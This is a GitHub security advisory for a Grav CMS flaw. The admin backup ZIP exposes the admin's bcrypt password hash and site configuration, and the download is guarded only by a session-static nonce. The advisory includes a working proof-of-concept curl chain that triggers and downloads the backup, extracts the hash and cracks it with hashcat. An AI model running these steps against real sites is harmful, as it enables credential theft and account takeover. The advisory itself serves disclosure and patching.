# [M] Grav: Admin Backup Zip File Exposes Account Credentials and Configuration Secrets

## Summary
Severity: Medium
Advisory: GHSA-2f86-9cp8-6hcf
CVE: CVE-2026-55885
CWE: CWE-312, CWE-522
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-2f86-9cp8-6hcf
Type: github-advisory

## Affected
- Packagist: `getgrav/grav` — affected >=0 <1.7.53

## Details
### Summary
An authenticated administrator with backup permissions can download a ZIP archive containing the full Grav installation root, including `user/accounts/admin.yaml` with the admin's bcrypt password hash and email, plus `user/config/` with all site configuration. The download endpoint requires only the session-static `admin-nonce` in the URL, no additional form-level CSRF token, and reveals the server's full filesystem path in a Base64-encoded query parameter. Combined with the absence of login rate limiting on `http://{Grav_URL}/admin`, an attacker who obtains a single admin-nonce value (via Referrer leakage, browser history, or XSS) can exfiltrate password hashes for offline cracking and achieve account takeover.

### Details
The vulnerability chain spans three components in the deployed Grav source tree at `/var/www/html/grav/`:

**1. Backup archive scope — `Backups::backup()`**  
`/var/www/html/grav/system/src/Grav/Common/Backup/Backups.php:201-272`

The `backup()` static method creates a ZIP of the directory specified by the backup profile's `root` property. The default profile (ID `0`, named `default_site_backup`) backs up the entire Grav root directory. On line 225, when the root is not a stream URI, it falls back to the full installation path:

```php
// Backups.php:225
$backup_root = rtrim(GRAV_ROOT . $backup->root, DS) ?: DS;
```

Since the default profile ships with no `root` override, `$backup->root` is empty, making `$backup_root` equal to `GRAV_ROOT` — i.e. `/var/www/html/grav/`. The archive therefore captures the entire installation including:

- `/var/www/html/grav/user/accounts/` — admin password hash, email, full name, granular permissions
- `/var/www/html/grav/user/config/` — system settings, potentially email SMTP credentials

The `exclude_files` and `exclude_paths` options on lines 232-235 are empty by default and offer no protection against including account files.

**2. Backup download handler — `AdminController::taskBackup()`**  
`/var/www/html/grav/user/plugins/admin/classes/plugin/AdminController.php:517-573`

After creating the backup ZIP, the controller Base64-encodes the full filesystem path and embeds it directly in a download URL displayed to the admin:

```php
// AdminController.php:558-560
$download = urlencode(base64_encode($backup));
$url = rtrim(...) . '/task' . $param_sep . 'backup/download' . $param_sep
       . $download . '/admin-nonce' . $param_sep . Utils::getNonce('admin-form');
```

The download handler (lines 532-541) decodes the path, locates the file via the `backup://` stream, and serves it with `Utils::download($file, true)`. It performs only two checks: the filename must end in `.zip` and the file must actually exist. It does **not** verify the file belongs to the requesting user, does **not** enforce a form-level nonce, and does **not** tie the download to a specific session.

**3. Nonce validation — permissive**  
The backup route is protected only by the `admin-nonce` parameter appended to the URL path. This nonce is session-static and shared across every admin page. No `form-nonce` is required — unlike page saves or configuration changes which demand both `admin-nonce` and `form-nonce`. This makes the backup download exploitable via a single crafted GET request from any attacker who knows the nonce value.

### PoC
**Prerequisites:** Admin session with valid `admin-nonce`.

**Step 1 — Authenticate and extract the session-static nonces:**
```bash
# Get login page, extract login-nonce, authenticate
NONCE=$(curl -s -c /tmp/jar "http://127.0.0.1/grav/admin" \
  | grep -oP 'name="login-nonce" value="\K[^"]+')
curl -s -b /tmp/jar -c /tmp/jar -X POST "http://127.0.0.1/grav/admin" \
  --data-urlencode "data[username]=admin" \
  --data-urlencode "data[password]=Passw0rd123!" \
  --data-urlencode "task=login" \
  --data-urlencode "login-nonce=${NONCE}"

# Extract the admin-nonce (same value on every admin page)
ADMIN_NONCE=$(curl -s -b /tmp/jar "http://127.0.0.1/grav/admin" \
  | grep -oP 'admin-nonce[:=]\K[a-f0-9]+' | head -1)
echo "Admin nonce: $ADMIN_NONCE"   # e.g. 68d6b108bc1398028365fb35ea760baf
```

**Step 2 — Trigger a backup (single GET, no form-nonce needed):**
```bash
curl -s -b /tmp/jar \
  "http://127.0.0.1/grav/admin/tools/backups.json/task:backup/admin-nonce:${ADMIN_NONCE}"
```

Response:
```json
{
  "status": "success",
  "message": "Your backup is ready for download. <a href=\"/grav/admin/task:backup/download:L3Zhci93d3cvaHRtbC9ncmF2L2JhY2t1cC9kZWZhdWx0X3NpdGVfYmFja3VwLS0yMDI2MDYxNjEyMjQ0OS56aXA=/admin-nonce:68d6b108...\" class=\"button\">Download backup</a>"
}
```

**Step 3 — Extract the Base64 download token and fetch the ZIP:**
```bash
# The download path is base64("/var/www/html/grav/backup/default_site_backup--20260616122449.zip")
# This reveals the full server filesystem path.
curl -s -b /tmp/jar -o /tmp/backup.zip \
  "http://127.0.0.1/grav/admin/task:backup/download:L3Zhci93d3cvaHRtbC9ncmF2L2JhY2t1cC9kZWZhdWx0X3NpdGVfYmFja3VwLS0yMDI2MDYxNjEyMjQ0OS56aXA=/admin-nonce:${ADMIN_NONCE}"
```

**Step 4 — Extract the password hash from the ZIP:**
```bash
unzip -p /tmp/backup.zip "user/accounts/admin.yaml"
```

Output:
```yaml
state: enabled
email: admin@grav.com
fullname: 'Grav Admin'
title: Administrator
access:
  admin:
    login: true
    super: true
  site:
    login: true
hashed_password: $2y$12$8StgOltcNbU5JD.D9Y5LmerDs.XBwLy5vSO3/9ReDYHjbv/aZTZ3m
```

**Step 5 — Crack the bcrypt hash offline:**
```bash
echo '$2y$12$8StgOltcNbU5JD.D9Y5LmerDs.XBwLy5vSO3/9ReDYHjbv/aZTZ3m' > hash.txt
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Step 6 — Log in with the cracked password (no rate limit):**
```bash
curl -s -b /tmp/jar -c /tmp/jar -X POST "http://127.0.0.1/grav/admin" \
  --data-urlencode "data[username]=admin" \
  --data-urlencode "data[password]=<cracked_password>" \
  --data-urlencode "task=login" \
  --data-urlencode "login-nonce=${NONCE}"
```

### Impact
- **Type:** Authenticated sensitive data exposure enabling offline credential theft
- **Attack surface:** Any actor who can obtain admin-nonce (session fixation, reflected XSS, Referrer header leakage, browser history inspection, or proxy log access)
- **Exposed data:** Admin username, email, full name, granular permission structure, bcrypt password hash (`$2y$12$...`), and full site configuration from `user/config/`
- **Downstream risk:** Offline hashcat cracking bypasses all server-side brute-force protections. With no login rate limiting (Finding 1), a cracked hash grants immediate unrestricted admin access including file modification and arbitrary code execution potential through Twig/themes
- **Server path leakage:** The Base64-encoded download token reveals the absolute filesystem path `/var/www/html/grav/backup/` — information critical for LFI, file-write, and path traversal attacks

## References
- https://github.com/getgrav/grav/security/advisories/GHSA-2f86-9cp8-6hcf
- https://github.com/getgrav/grav
